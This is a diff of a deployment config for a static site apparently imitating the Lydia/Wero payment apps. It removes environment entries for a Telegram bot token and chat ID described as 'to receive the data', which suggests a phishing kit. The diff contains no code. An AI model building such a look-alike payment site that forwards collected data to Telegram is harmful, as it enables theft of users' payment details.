@@ -1,18 +1,7 @@
 {
   "name": "lydia-wero-design",
   "version": "1.0.0",
-  "description": "Application de paiement instantané Lydia avec design moderne",
   "buildCommand": "echo 'Static site - no build needed'",
   "outputDirectory": ".",
-  "framework": "static",
-  "env": [
-    {
-      "key": "TELEGRAM_BOT_TOKEN",
-      "description": "Telegram Bot Token pour recevoir les données"
-    },
-    {
-      "key": "TELEGRAM_CHAT_ID",
-      "description": "Telegram Chat ID pour les notifications"
-    }
-  ]
+  "framework": "static"
 }
